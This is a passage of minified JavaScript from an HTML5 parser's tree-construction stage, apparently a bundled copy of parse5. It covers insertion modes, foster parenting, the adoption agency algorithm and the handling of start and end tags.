e=this.openElements.stackTop;e>=0;e--)switch(e===0&&this.fragmentContext?this.fragmentContextID:this.openElements.tagIDs[e]){case S.TR:{this.insertionMode=W.IN_ROW;return}case S.TBODY:case S.THEAD:case S.TFOOT:{this.insertionMode=W.IN_TABLE_BODY;return}case S.CAPTION:{this.insertionMode=W.IN_CAPTION;return}case S.COLGROUP:{this.insertionMode=W.IN_COLUMN_GROUP;return}case S.TABLE:{this.insertionMode=W.IN_TABLE;return}case S.BODY:{this.insertionMode=W.IN_BODY;return}case S.FRAMESET:{this.insertionMode=W.IN_FRAMESET;return}case S.SELECT:{this._resetInsertionModeForSelect(e);return}case S.TEMPLATE:{this.insertionMode=this.tmplInsertionModeStack[0];return}case S.HTML:{this.insertionMode=this.headElement?W.AFTER_HEAD:W.BEFORE_HEAD;return}case S.TD:case S.TH:{if(e>0){this.insertionMode=W.IN_CELL;return}break}case S.HEAD:{if(e>0){this.insertionMode=W.IN_HEAD;return}break}}this.insertionMode=W.IN_BODY}_resetInsertionModeForSelect(e){if(e>0)for(let t=e-1;t>0;t--){const n=this.openElements.tagIDs[t];if(n===S.TEMPLATE)break;if(n===S.TABLE){this.insertionMode=W.IN_SELECT_IN_TABLE;return}}this.insertionMode=W.IN_SELECT}_isElementCausesFosterParenting(e){return oN.has(e)}_shouldFosterParentOnInsertion(){return this.fosterParentingEnabled&&this.openElements.currentTagId!==void 0&&this._isElementCausesFosterParenting(this.openElements.currentTagId)}_findFosterParentingLocation(){for(let e=this.openElements.stackTop;e>=0;e--){const t=this.openElements.items[e];switch(this.openElements.tagIDs[e]){case S.TEMPLATE:{if(this.treeAdapter.getNamespaceURI(t)===Ce.HTML)return{parent:this.treeAdapter.getTemplateContent(t),beforeElement:null};break}case S.TABLE:{const n=this.treeAdapter.getParentNode(t);return n?{parent:n,beforeElement:t}:{parent:this.openElements.items[e-1],beforeElement:null}}}}return{parent:this.openElements.items[0],beforeElement:null}}_fosterParentElement(e){const t=this._findFosterParentingLocation();t.beforeElement?this.treeAdapter.insertBefore(t.parent,e,t.beforeElement):this.treeAdapter.appendChild(t.parent,e)}_isSpecialElement(e,t){const n=this.treeAdapter.getNamespaceURI(e);return y$[n].has(t)}onCharacter(e){if(this.skipNextNewLine=!1,this.tokenizer.inForeignNode){IZ(this,e);return}switch(this.insertionMode){case W.INITIAL:{md(this,e);break}case W.BEFORE_HTML:{Ud(this,e);break}case W.BEFORE_HEAD:{zd(this,e);break}case W.IN_HEAD:{Bd(this,e);break}case W.IN_HEAD_NO_SCRIPT:{Fd(this,e);break}case W.AFTER_HEAD:{Vd(this,e);break}case W.IN_BODY:case W.IN_CAPTION:case W.IN_CELL:case W.IN_TEMPLATE:{rN(this,e);break}case W.TEXT:case W.IN_SELECT:case W.IN_SELECT_IN_TABLE:{this._insertCharacters(e);break}case W.IN_TABLE:case W.IN_TABLE_BODY:case W.IN_ROW:{Ey(this,e);break}case W.IN_TABLE_TEXT:{mN(this,e);break}case W.IN_COLUMN_GROUP:{Nh(this,e);break}case W.AFTER_BODY:{_h(this,e);break}case W.AFTER_AFTER_BODY:{$f(this,e);break}}}onNullCharacter(e){if(this.skipNextNewLine=!1,this.tokenizer.inForeignNode){RZ(this,e);return}switch(this.insertionMode){case W.INITIAL:{md(this,e);break}case W.BEFORE_HTML:{Ud(this,e);break}case W.BEFORE_HEAD:{zd(this,e);break}case W.IN_HEAD:{Bd(this,e);break}case W.IN_HEAD_NO_SCRIPT:{Fd(this,e);break}case W.AFTER_HEAD:{Vd(this,e);break}case W.TEXT:{this._insertCharacters(e);break}case W.IN_TABLE:case W.IN_TABLE_BODY:case W.IN_ROW:{Ey(this,e);break}case W.IN_COLUMN_GROUP:{Nh(this,e);break}case W.AFTER_BODY:{_h(this,e);break}case W.AFTER_AFTER_BODY:{$f(this,e);break}}}onComment(e){if(this.skipNextNewLine=!1,this.currentNotInHTML){O0(this,e);return}switch(this.insertionMode){case W.INITIAL:case W.BEFORE_HTML:case W.BEFORE_HEAD:case W.IN_HEAD:case W.IN_HEAD_NO_SCRIPT:case W.AFTER_HEAD:case W.IN_BODY:case W.IN_TABLE:case W.IN_CAPTION:case W.IN_COLUMN_GROUP:case W.IN_TABLE_BODY:case W.IN_ROW:case W.IN_CELL:case W.IN_SELECT:case W.IN_SELECT_IN_TABLE:case W.IN_TEMPLATE:case W.IN_FRAMESET:case W.AFTER_FRAMESET:{O0(this,e);break}case W.IN_TABLE_TEXT:{fd(this,e);break}case W.AFTER_BODY:{sX(this,e);break}case W.AFTER_AFTER_BODY:case W.AFTER_AFTER_FRAMESET:{rX(this,e);break}}}onDoctype(e){switch(this.skipNextNewLine=!1,this.insertionMode){case W.INITIAL:{lX(this,e);break}case W.BEFORE_HEAD:case W.IN_HEAD:case W.IN_HEAD_NO_SCRIPT:case W.AFTER_HEAD:{this._err(e,pe.misplacedDoctype);break}case W.IN_TABLE_TEXT:{fd(this,e);break}}}onStartTag(e){this.skipNextNewLine=!1,this.currentToken=e,this._processStartTag(e),e.selfClosing&&!e.ackSelfClosing&&this._err(e,pe.nonVoidHtmlElementStartTagWithTrailingSolidus)}_processStartTag(e){this.shouldProcessStartTagTokenInForeignContent(e)?wZ(this,e):this._startTagOutsideForeignContent(e)}_startTagOutsideForeignContent(e){switch(this.insertionMode){case W.INITIAL:{md(this,e);break}case W.BEFORE_HTML:{cX(this,e);break}case W.BEFORE_HEAD:{dX(this,e);break}case W.IN_HEAD:{Ri(this,e);break}case W.IN_HEAD_NO_SCRIPT:{fX(this,e);break}case W.AFTER_HEAD:{gX(this,e);break}case W.IN_BODY:{Wt(this,e);break}case W.IN_TABLE:{Oc(this,e);break}case W.IN_TABLE_TEXT:{fd(this,e);break}case W.IN_CAPTION:{pZ(this,e);break}case W.IN_COLUMN_GROUP:{tS(this,e);break}case W.IN_TABLE_BODY:{Tg(this,e);break}case W.IN_ROW:{xg(this,e);break}case W.IN_CELL:{hZ(this,e);break}case W.IN_SELECT:{gN(this,e);break}case W.IN_SELECT_IN_TABLE:{bZ(this,e);break}case W.IN_TEMPLATE:{yZ(this,e);break}case W.AFTER_BODY:{SZ(this,e);break}case W.IN_FRAMESET:{CZ(this,e);break}case W.AFTER_FRAMESET:{xZ(this,e);break}case W.AFTER_AFTER_BODY:{PZ(this,e);break}case W.AFTER_AFTER_FRAMESET:{LZ(this,e);break}}}onEndTag(e){this.skipNextNewLine=!1,this.currentToken=e,this.currentNotInHTML?jZ(this,e):this._endTagOutsideForeignContent(e)}_endTagOutsideForeignContent(e){switch(this.insertionMode){case W.INITIAL:{md(this,e);break}case W.BEFORE_HTML:{uX(this,e);break}case W.BEFORE_HEAD:{pX(this,e);break}case W.IN_HEAD:{mX(this,e);break}case W.IN_HEAD_NO_SCRIPT:{hX(this,e);break}case W.AFTER_HEAD:{bX(this,e);break}case W.IN_BODY:{Cg(this,e);break}case W.TEXT:{tZ(this,e);break}case W.IN_TABLE:{dp(this,e);break}case W.IN_TABLE_TEXT:{fd(this,e);break}case W.IN_CAPTION:{mZ(this,e);break}case W.IN_COLUMN_GROUP:{fZ(this,e);break}case W.IN_TABLE_BODY:{U0(this,e);break}case W.IN_ROW:{hN(this,e);break}case W.IN_CELL:{gZ(this,e);break}case W.IN_SELECT:{bN(this,e);break}case W.IN_SELECT_IN_TABLE:{vZ(this,e);break}case W.IN_TEMPLATE:{EZ(this,e);break}case W.AFTER_BODY:{yN(this,e);break}case W.IN_FRAMESET:{TZ(this,e);break}case W.AFTER_FRAMESET:{AZ(this,e);break}case W.AFTER_AFTER_BODY:{$f(this,e);break}}}onEof(e){switch(this.insertionMode){case W.INITIAL:{md(this,e);break}case W.BEFORE_HTML:{Ud(this,e);break}case W.BEFORE_HEAD:{zd(this,e);break}case W.IN_HEAD:{Bd(this,e);break}case W.IN_HEAD_NO_SCRIPT:{Fd(this,e);break}case W.AFTER_HEAD:{Vd(this,e);break}case W.IN_BODY:case W.IN_TABLE:case W.IN_CAPTION:case W.IN_COLUMN_GROUP:case W.IN_TABLE_BODY:case W.IN_ROW:case W.IN_CELL:case W.IN_SELECT:case W.IN_SELECT_IN_TABLE:{dN(this,e);break}case W.TEXT:{nZ(this,e);break}case W.IN_TABLE_TEXT:{fd(this,e);break}case W.IN_TEMPLATE:{vN(this,e);break}case W.AFTER_BODY:case W.IN_FRAMESET:case W.AFTER_FRAMESET:case W.AFTER_AFTER_BODY:case W.AFTER_AFTER_FRAMESET:{aS(this,e);break}}}onWhitespaceCharacter(e){if(this.skipNextNewLine&&(this.skipNextNewLine=!1,e.chars.charCodeAt(0)===z.LINE_FEED)){if(e.chars.length===1)return;e.chars=e.chars.substr(1)}if(this.tokenizer.inForeignNode){this._insertCharacters(e);return}switch(this.insertionMode){case W.IN_HEAD:case W.IN_HEAD_NO_SCRIPT:case W.AFTER_HEAD:case W.TEXT:case W.IN_COLUMN_GROUP:case W.IN_SELECT:case W.IN_SELECT_IN_TABLE:case W.IN_FRAMESET:case W.AFTER_FRAMESET:{this._insertCharacters(e);break}case W.IN_BODY:case W.IN_CAPTION:case W.IN_CELL:case W.IN_TEMPLATE:case W.AFTER_BODY:case W.AFTER_AFTER_BODY:case W.AFTER_AFTER_FRAMESET:{sN(this,e);break}case W.IN_TABLE:case W.IN_TABLE_BODY:case W.IN_ROW:{Ey(this,e);break}case W.IN_TABLE_TEXT:{pN(this,e);break}}}}function eX(a,e){let t=a.activeFormattingElements.getElementEntryInScopeWithTagName(e.tagName);return t?a.openElements.contains(t.element)?a.openElements.hasInScope(e.tagID)||(t=null):(a.activeFormattingElements.removeEntry(t),t=null):uN(a,e),t}function aX(a,e){let t=null,n=a.openElements.stackTop;for(;n>=0;n--){const i=a.openElements.items[n];if(i===e.element)break;a._isSpecialElement(i,a.openElements.tagIDs[n])&&(t=i)}return t||(a.openElements.shortenToLength(Math.max(n,0)),a.activeFormattingElements.removeEntry(e)),t}function tX(a,e,t){let n=e,i=a.openElements.getCommonAncestor(e);for(let r=0,l=i;l!==t;r++,l=i){i=a.openElements.getCommonAncestor(l);const u=a.activeFormattingElements.getElementEntry(l),d=u&&r>=X$;!u||d?(d&&a.activeFormattingElements.removeEntry(u),a.openElements.remove(l)):(l=nX(a,u),n===e&&(a.activeFormattingElements.bookmark=u),a.treeAdapter.detachNode(n),a.treeAdapter.appendChild(l,n),n=l)}return n}function nX(a,e){const t=a.treeAdapter.getNamespaceURI(e.element),n=a.treeAdapter.createElement(e.token.tagName,t,e.token.attrs);return a.openElements.replace(e.element,n),e.element=n,n}function iX(a,e,t){const n=a.treeAdapter.getTagName(e),i=eu(n);if(a._isElementCausesFosterParenting(i))a._fosterParentElement(t);else{const r=a.treeAdapter.getNamespaceURI(e);i===S.TEMPLATE&&r===Ce.HTML&&(e=a.treeAdapter.getTemplateContent(e)),a.treeAdapter.appendChild(e,t)}}function oX(a,e,t){const n=a.treeAdapter.getNamespaceURI(t.element),{token:i}=t,r=a.treeAdapter.createElement(i.tagName,n,i.attrs);a._adoptNodes(e,r),a.treeAdapter.appendChild(e,r),a.activeFormattingElements.insertElementAfterBookmark(r,i),a.activeFormattingElements.removeEntry(t),a.openElements.remove(t.element),a.openElements.insertAfter(e,r,i.tagID)}function eS(a,e){for(let t=0;t<$$;t++){const n=eX(a,e);if(!n)break;const i=aX(a,n);if(!i)break;a.activeFormattingElements.bookmark=n;const r=tX(a,i,n.element),l=a.openElements.getCommonAncestor(n.element);a.treeAdapter.detachNode(r),l&&iX(a,l,r),oX(a,i,n)}}function O0(a,e){a._appendCommentNode(e,a.openElements.currentTmplContentOrNode)}function sX(a,e){a._appendCommentNode(e,a.openElements.items[0])}function rX(a,e){a._appendCommentNode(e,a.document)}function aS(a,e){if(a.stopped=!0,e.location){const t=a.fragmentContext?0:2;for(let n=a.openElements.stackTop;n>=t;n--)a._setEndLocation(a.openElements.items[n],e);if(!a.fragmentContext&&a.openElements.stackTop>=0){const n=a.openElements.items[0],i=a.treeAdapter.getNodeSourceCodeLocation(n);if(i&&!i.endTag&&(a._setEndLocation(n,e),a.openElements.stackTop>=1)){const r=a.openElements.items[1],l=a.treeAdapter.getNodeSourceCodeLocation(r);l&&!l.endTag&&a._setEndLocation(r,e)}}}}function lX(a,e){a._setDocumentType(e);const t=e.forceQuirks?Kn.QUIRKS:O$(e);k$(e)||a._err(e,pe.nonConformingDoctype),a.treeAdapter.setDocumentMode(a.document,t),a.insertionMode=W.BEFORE_HTML}function md(a,e){a._err(e,pe.missingDoctype,!0),a.treeAdapter.setDocumentMode(a.document,Kn.QUIRKS),a.insertionMode=W.BEFORE_HTML,a._processToken(e)}function cX(a,e){e.tagID===S.HTML?(a._insertElement(e,Ce.HTML),a.insertionMode=W.BEFORE_HEAD):Ud(a,e)}function uX(a,e){const t=e.tagID;(t===S.HTML||t===S.HEAD||t===S.BODY||t===S.BR)&&Ud(a,e)}function Ud(a,e){a._insertFakeRootElement(),a.insertionMode=W.BEFORE_HEAD,a._processToken(e)}function dX(a,e){switch(e.tagID){case S.HTML:{Wt(a,e);break}case S.HEAD:{a._insertElement(e,Ce.HTML),a.headElement=a.openElements.current,a.insertionMode=W.IN_HEAD;break}default:zd(a,e)}}function pX(a,e){const t=e.tagID;t===S.HEAD||t===S.BODY||t===S.HTML||t===S.BR?zd(a,e):a._err(e,pe.endTagWithoutMatchingOpenElement)}function zd(a,e){a._insertFakeElement(ne.HEAD,S.HEAD),a.headElement=a.openElements.current,a.insertionMode=W.IN_HEAD,a._processToken(e)}function Ri(a,e){switch(e.tagID){case S.HTML:{Wt(a,e);break}case S.BASE:case S.BASEFONT:case S.BGSOUND:case S.LINK:case S.META:{a._appendElement(e,Ce.HTML),e.ackSelfClosing=!0;break}case S.TITLE:{a._switchToTextParsing(e,tt.RCDATA);break}case S.NOSCRIPT:{a.options.scriptingEnabled?a._switchToTextParsing(e,tt.RAWTEXT):(a._insertElement(e,Ce.HTML),a.insertionMode=W.IN_HEAD_NO_SCRIPT);break}case S.NOFRAMES:case S.STYLE:{a._switchToTextParsing(e,tt.RAWTEXT);break}case S.SCRIPT:{a._switchToTextParsing(e,tt.SCRIPT_DATA);break}case S.TEMPLATE:{a._insertTemplate(e),a.activeFormattingElements.insertMarker(),a.framesetOk=!1,a.insertionMode=W.IN_TEMPLATE,a.tmplInsertionModeStack.unshift(W.IN_TEMPLATE);break}case S.HEAD:{a._err(e,pe.misplacedStartTagForHeadElement);break}default:Bd(a,e)}}function mX(a,e){switch(e.tagID){case S.HEAD:{a.openElements.pop(),a.insertionMode=W.AFTER_HEAD;break}case S.BODY:case S.BR:case S.HTML:{Bd(a,e);break}case S.TEMPLATE:{gl(a,e);break}default:a._err(e,pe.endTagWithoutMatchingOpenElement)}}function gl(a,e){a.openElements.tmplCount>0?(a.openElements.generateImpliedEndTagsThoroughly(),a.openElements.currentTagId!==S.TEMPLATE&&a._err(e,pe.closingOfElementWithOpenChildElements),a.openElements.popUntilTagNamePopped(S.TEMPLATE),a.activeFormattingElements.clearToLastMarker(),a.tmplInsertionModeStack.shift(),a._resetInsertionMode()):a._err(e,pe.endTagWithoutMatchingOpenElement)}function Bd(a,e){a.openElements.pop(),a.insertionMode=W.AFTER_HEAD,a._processToken(e)}function fX(a,e){switch(e.tagID){case S.HTML:{Wt(a,e);break}case S.BASEFONT:case S.BGSOUND:case S.HEAD:case S.LINK:case S.META:case S.NOFRAMES:case S.STYLE:{Ri(a,e);break}case S.NOSCRIPT:{a._err(e,pe.nestedNoscriptInHead);break}default:Fd(a,e)}}function hX(a,e){switch(e.tagID){case S.NOSCRIPT:{a.openElements.pop(),a.insertionMode=W.IN_HEAD;break}case S.BR:{Fd(a,e);break}default:a._err(e,pe.endTagWithoutMatchingOpenElement)}}function Fd(a,e){const t=e.type===na.EOF?pe.openElementsLeftAfterEof:pe.disallowedContentInNoscriptInHead;a._err(e,t),a.openElements.pop(),a.insertionMode=W.IN_HEAD,a._processToken(e)}function gX(a,e){switch(e.tagID){case S.HTML:{Wt(a,e);break}case S.BODY:{a._insertElement(e,Ce.HTML),a.framesetOk=!1,a.insertionMode=W.IN_BODY;break}case S.FRAMESET:{a._insertElement(e,Ce.HTML),a.insertionMode=W.IN_FRAMESET;break}case S.BASE:case S.BASEFONT:case S.BGSOUND:case S.LINK:case S.META:case S.NOFRAMES:case S.SCRIPT:case S.STYLE:case S.TEMPLATE:case S.TITLE:{a._err(e,pe.abandonedHeadElementChild),a.openElements.push(a.headElement,S.HEAD),Ri(a,e),a.openElements.remove(a.headElement);break}case S.HEAD:{a._err(e,pe.misplacedStartTagForHeadElement);break}default:Vd(a,e)}}function bX(a,e){switch(e.tagID){case S.BODY:case S.HTML:case S.BR:{Vd(a,e);break}case S.TEMPLATE:{gl(a,e);break}default:a._err(e,pe.endTagWithoutMatchingOpenElement)}}function Vd(a,e){a._insertFakeElement(ne.BODY,S.BODY),a.insertionMode=W.IN_BODY,Sg(a,e)}function Sg(a,e){switch(e.type){case na.CHARACTER:{rN(a,e);break}case na.WHITESPACE_CHARACTER:{sN(a,e);break}case na.COMMENT:{O0(a,e);break}case na.START_TAG:{Wt(a,e);break}case na.END_TAG:{Cg(a,e);break}case na.EOF:{dN(a,e);break}}}function sN(a,e){a._reconstructActiveFormattingElements(),a._insertCharacters(e)}function rN(a,e){a._reconstructActiveFormattingElements(),a._insertCharacters(e),a.framesetOk=!1}function vX(a,e){a.openElements.tmplCount===0&&a.treeAdapter.adoptAttributes(a.openElements.items[0],e.attrs)}function yX(a,e){const t=a.openElements.tryPeekProperlyNestedBodyElement();t&&a.openElements.tmplCount===0&&(a.framesetOk=!1,a.treeAdapter.adoptAttributes(t,e.attrs))}function EX(a,e){const t=a.openElements.tryPeekProperlyNestedBodyElement();a.framesetOk&&t&&(a.treeAdapter.detachNode(t),a.openElements.popAllUpToHtmlElement(),a._insertElement(e,Ce.HTML),a.insertionMode=W.IN_FRAMESET)}function SX(a,e){a.openElements.hasInButtonScope(S.P)&&a._closePElement(),a._insertElement(e,Ce.HTML)}function CX(a,e){a.openElements.hasInButtonScope(S.P)&&a._closePElement(),a.openElements.currentTagId!==void 0&&k0.has(a.openElements.currentTagId)&&a.openElements.pop(),a._insertElement(e,Ce.HTML)}function TX(a,e){a.openElements.hasInButtonScope(S.P)&&a._closePElement(),a._insertElement(e,Ce.HTML),a.skipNextNewLine=!0,a.framesetOk=!1}function xX(a,e){const t=a.openElements.tmplCount>0;(!a.formElement||t)&&(a.openElements.hasInButtonScope(S.P)&&a._closePElement(),a._insertElement(e,Ce.HTML),t||(a.formElement=a.openElements.current))}function AX(a,e){a.framesetOk=!1;const t=e.tagID;for(let n=a.openElements.stackTop;n>=0;n--){const i=a.openElements.tagIDs[n];if(t===S.LI&&i===S.LI||(t===S.DD||t===S.DT)&&(i===S.DD||i===S.DT)){a.openElements.generateImpliedEndTagsWithExclusion(i),a.openElements.popUntilTagNamePopped(i);break}if(i!==S.ADDRESS&&i!==S.DIV&&i!==S.P&&a._isSpecialElement(a.openElements.items[n],i))break}a.openElements.hasInButtonScope(S.P)&&a._closePElement(),a._insertElement(e,Ce.HTML)}function PX(a,e){a.openElements.hasInButtonScope(S.P)&&a._closePElement(),a._insertElement(e,Ce.HTML),a.tokenizer.state=tt.PLAINTEXT}function LX(a,e){a.openElements.hasInScope(S.BUTTON)&&(a.openElements.generateImpliedEndTags(),a.openElements.popUntilTagNamePopped(S.BUTTON)),a._reconstructActiveFormattingElements(),a._insertElement(e,Ce.HTML),a.framesetOk=!1}function RX(a,e){const t=a.activeFormattingElements.getElementEntryInScopeWithTagName(ne.A);t&&(eS(a,e),a.openElements.remove(t.element),a.activeFormattingElements.removeEntry(t)),a._reconstructActiveFormattingElements(),a._insertElement(e,Ce.HTML),a.activeFormattingElements.pushElement(a.openElements.current,e)}function IX(a,e){a._reconstructActiveFormattingElements(),a._insertElement(e,Ce.HTML),a.activeFormattingElements.pushElement(a.openElements.current,e)}function wX(a,e){a._reconstructActiveFormattingElements(),a.openElements.hasInScope(S.NOBR)&&(eS(a,e),a._reconstructActiveFormattingElements()),a._insertElement(e,Ce.HTML),a.activeFormattingElements.pushElement(a.openElements.current,e)}function jX(a,e){a._reconstructActiveFormattingElements(),a._insertElement(e,Ce.HTML),a.activeFormattingElements.insertMarker(),a.framesetOk=!1}function DX(a,e){a.treeAdapter.getDocumentMode(a.document)!==Kn.QUIRKS&&a.openElements.hasInButtonScope(S.P)&&a._closePElement(),a._insertElement(e,Ce.HTML),a.framesetOk=!1,a.insertionMode=W.IN_TABLE}function lN(a,e){a._reconstructActiveFormattingElements(),a._appendElement(e,Ce.HTML),a.framesetOk=!1,e.ackSelfClosing=!0}function cN(a){const e=$M(a,el.TYPE);return e!=null&&e.toLowerCase()===Y$}function MX(a,e){a._reconstructActiveFormattingElements(),a._appendElement(e,Ce.HTML),cN(e)||(a.framesetOk=!1),e.ackSelfClosing=!0}function NX(a,e){a._appendElement(e,Ce.HTML),e.ackSelfClosing=!0}function _X(a,e){a.openElements.hasInButtonScope(S.P)&&a._closePElement(),a._appendElement(e,Ce.HTML),a.framesetOk=!1,e.ackSelfClosing=!0}function qX(a,e){e.tagName=ne.IMG,e.tagID=S.IMG,lN(a,e)}function kX(a,e){a._insertElement(e,Ce.HTML),a.skipNextNewLine=!0,a.tokenizer.state=tt.RCDATA,a.originalInsertionMode=a.insertionMode,a.framesetOk=!1,a.insertionMode=W.TEXT}function OX(a,e){a.openElements.hasInButtonScope(S.P)&&a._closePElement(),a._reconstructActiveFormattingElements(),a.framesetOk=!1,a._switchToTextParsing(e,tt.RAWTEXT)}function UX(a,e){a.framesetOk=!1,a._switchToTextParsing(e,tt.RAWTEXT)}function TL(a,e){a._switchToTextParsing(e,tt.RAWTEXT)}function zX(a,e){a._reconstructActiveFormattingElements(),a._insertElement(e,Ce.HTML),a.framesetOk=!1,a.insertionMode=a.insertionMode===W.IN_TABLE||a.insertionMode===W.IN_CAPTION||a.insertionMode===W.IN_TABLE_BODY||a.insertionMode===W.IN_ROW||a.insertionMode===W.IN_CELL?W.IN_SELECT_IN_TABLE:W.IN_SELECT}function BX(a,e){a.openElements.currentTagId===S.OPTION&&a.openElements.pop(),a._reconstructActiveFormattingElements(),a._insertElement(e,Ce.HTML)}function FX(a,e){a.openElements.hasInScope(S.RUBY)&&a.openElements.generateImpliedEndTags(),a._insertElement(e,Ce.HTML)}function VX(a,e){a.openElements.hasInScope(S.RUBY)&&a.openElements.generateImpliedEndTagsWithExclusion(S.RTC),a._insertElement(e,Ce.HTML)}function HX(a,e){a._reconstructActiveFormattingElements(),nN(e),Z1(e),e.selfClosing?a._appendElement(e,Ce.MATHML):a._insertElement(e,Ce.MATHML),e.ackSelfClosing=!0}function GX(a,e){a._reconstructActiveFormattingElements(),iN(e),Z1(e),e.selfClosing?a._appendElement(e,Ce.SVG):a._insertElement(e,Ce.SVG),e.ackSelfClosing=!0}function xL(a,e){a._reconstructActiveFormattingElements(),a._insertElement(e,Ce.HTML)}function Wt(a,e){switch(e.tagID){case S.I:case S.S:case S.B:case S.U:case S.EM:case S.TT:case S.BIG:case S.CODE:case S.FONT:case S.SMALL:case S.STRIKE:case S.STRONG:{IX(a,e);break}case S.A:{RX(a,e);break}case S.H1:case S.H2:case S.H3:case S.H4:case S.H5:case S.H6:{CX(a,e);break}case S.P:case S.DL:case S.OL:case S.UL:case S.DIV:case S.DIR:case S.NAV:case S.MAIN:case S.MENU:case S.ASIDE:case S.CENTER:case S.FIGURE:case S.FOOTER:case S.HEADER:case S.HGROUP:case S.DIALOG:case S.DETAILS:case S.ADDRESS:case S.ARTICLE:case S.SEARCH:case S.SECTION:case S.SUMMARY:case S.FIELDSET:case S.BLOCKQUOTE:case S.FIGCAPTION:{SX(a,e);break}case S.LI:case S.DD:case S.DT:{AX(a,e);break}case S.BR:case S.IMG:case S.WBR:case S.AREA:case S.EMBED:case S.KEYGEN:{lN(a,e);break}case S.HR:{_X(a,e);break}case S.RB:case S.RTC:{FX(a,e);break}case S.RT:case S.RP:{VX(a,e);break}case S.PRE:case S.LISTING:{TX(a,e);break}case S.XMP:{OX(a,e);break}case S.SVG:{GX(a,e);break}case S.HTML:{vX(a,e);break}case S.BASE:case S.LINK:case S.META:case S.STYLE:case S.TITLE:case S.SCRIPT:case S.BGSOUND:case S.BASEFONT:case S.TEMPLATE:{Ri(a,e);break}case S.BODY:{yX(a,e);break}case S.FORM:{xX(a,e);break}case S.NOBR:{wX(a,e);break}case S.MATH:{HX(a,e);break}case S.TABLE:{DX(a,e);break}case S.INPUT:{MX(a,e);break}case S.PARAM:case S.TRACK:case S.SOURCE:{NX(a,e);break}case S.IMAGE:{qX(a,e);break}case S.BUTTON:{LX(a,e);break}case S.APPLET:case S.OBJECT:case S.MARQUEE:{jX(a,e);break}case S.IFRAME:{UX(a,e);break}case S.SELECT:{zX(a,e);break}case S.OPTION:case S.OPTGROUP:{BX(a,e);break}case S.NOEMBED:case S.NOFRAMES:{TL(a,e);break}case S.FRAMESET:{EX(a,e);break}case S.TEXTAREA:{kX(a,e);break}case S.NOSCRIPT:{a.options.scriptingEnabled?TL(a,e):xL(a,e);break}case S.PLAINTEXT:{PX(a,e);break}case S.COL:case S.TH:case S.TD:case S.TR:case S.HEAD:case S.FRAME:case S.TBODY:case S.TFOOT:case S.THEAD:case S.CAPTION:case S.COLGROUP:break;default:xL(a,e)}}function QX(a,e){if(a.openElements.hasInScope(S.BODY)&&(a.insertionMode=W.AFTER_BODY,a.options.sourceCodeLocationInfo)){const t=a.openElements.tryPeekProperlyNestedBodyElement();t&&a._setEndLocation(t,e)}}function JX(a,e){a.openElements.hasInScope(S.BODY)&&(a.insertionMode=W.AFTER_BODY,yN(a,e))}function WX(a,e){const t=e.tagID;a.openElements.hasInScope(t)&&(a.openElements.generateImpliedEndTags(),a.openElements.popUntilTagNamePopped(t))}function KX(a){const e=a.openElements.tmplCount>0,{formElement:t}=a;e||(a.formElement=null),(t||e)&&a.openElements.hasInScope(S.FORM)&&(a.openElements.generateImpliedEndTags(),e?a.openElements.popUntilTagNamePopped(S.FORM):t&&a.openElements.remove(t))}function YX(a){a.openElements.hasInButtonScope(S.P)||a._insertFakeElement(ne.P,S.P),a._closePElement()}function $X(a){a.openElements.hasInListItemScope(S.LI)&&(a.openElements.generateImpliedEndTagsWithExclusion(S.LI),a.openElements.popUntilTagNamePopped(S.LI))}function XX(a,e){const t=e.tagID;a.openElements.hasInScope(t)&&(a.openElements.generateImpliedEndTagsWithExclusion(t),a.openElements.popUntilTagNamePopped(t))}function ZX(a){a.openElements.hasNumberedHeaderInScope()&&(a.openElements.generateImpliedEndTags(),a.openElements.popUntilNumberedHeaderPopped())}function eZ(a,e){const t=e.tagID;a.openElements.hasInScope(t)&&(a.openElements.generateImpliedEndTags(),a.openElements.popUntilTagNamePopped(t),a.activeFormattingElements.clearToLastMarker())}function aZ(a){a._reconstructActiveFormattingElements(),a._insertFakeElement(ne.BR,S.BR),a.openElements.pop(),a.framesetOk=!1}function uN(a,e){const t=e.tagName,n=e.tagID;for(let i=a.openElements.stackTop;i>0;i--){const r=a.openElements.items[i],l=a.openElements.tagIDs[i];if(n===l&&(n!==S.UNKNOWN||a.treeAdapter.getTagName(r)===t)){a.openElements.generateImpliedEndTagsWithExclusion(n),a.openElements.stackTop>=i&&a.openElements.shortenToLength(i);break}if(a._isSpecialElement(r,l))break}}function Cg(a,e){switch(e.tagID){case S.A:case S.B:case S.I:case S.S:case S.U:case S.EM:case S.TT:case S.BIG:case S.CODE:case S.FONT:case S.NOBR:case S.SMALL:case S.STRIKE:case S.STRONG:{eS(a,e);break}case S.P:{YX(a);break}case S.DL:case S.UL:case S.OL:case S.DIR:case S.DIV:case S.NAV:case S.PRE:case S.MAIN:case S.MENU:case S.ASIDE:case S.BUTTON:case S.CENTER:case S.FIGURE:case S.FOOTER:case S.HEADER:case S.HGROUP:case S.DIALOG:case S.ADDRESS:case S.ARTICLE:case S.DETAILS:case S.SEARCH:case S.SECTION:case S.SUMMARY:case S.LISTING:case S.FIELDSET:case S.BLOCKQUOTE:case S.FIGCAPTION:{WX(a,e);break}case S.LI:{$X(a);break}case S.DD:case S.DT:{XX(a,e);break}case S.H1:case S.H2:case S.H3:case S.H4:case S.H5:case S.H6:{ZX(a);break}case S.BR:{aZ(a);break}case S.BODY:{QX(a,e);break}case S.HTML:{JX(a,e);break}case S.FORM:{KX(a);break}case S.APPLET:case S.OBJECT:case S.MARQUEE:{eZ(a,e);break}case S.TEMPLATE:{gl(a,e);break}default:uN(a,e)}}function dN(a,e){a.tmplInsertionModeStack.length>0?vN(a,e):aS(a,e)}function tZ(a,e){var t;e.tagID===S.SCRIPT&&((t=a.scriptHandler)===null||t===void 0||t.call(a,a.openElements.current)),a.openElements.pop(),a.insertionMode=a.originalInsertionMode}function nZ(a,e){a._err(e,pe.eofInElementThatCanContainOnlyText),a.openElements.pop(),a.insertionMode=a.originalInsertionMode,a.onEof(e)}function Ey(a,e){if(a.openElements.currentTagId!==void 0&&oN.has(a.openElements.currentTagId))switch(a.pendingCharacterTokens.length=0,a.hasNonWhitespacePendingCharacterToken=!1,a.originalInsertionMode=a.insertionMode,a.insertionMode=W.IN_TABLE_TEXT,e.type){case na.CHARACTER:{mN(a,e);break}case na.WHITESPACE_CHARACTER:{pN(a,e);break}}else kp(a,e)}function iZ(a,e){a.openElements.clearBackToTableContext(),a.activeFormattingElements.insertMarker(),a._insertElement(e,Ce.HTML),a.insertionMode=W.IN_CAPTION}function oZ(a,e){a.openElements.clearBackToTableContext(),a._insertElement(e,Ce.HTML),a.insertionMode=W.IN_COLUMN_GROUP}function 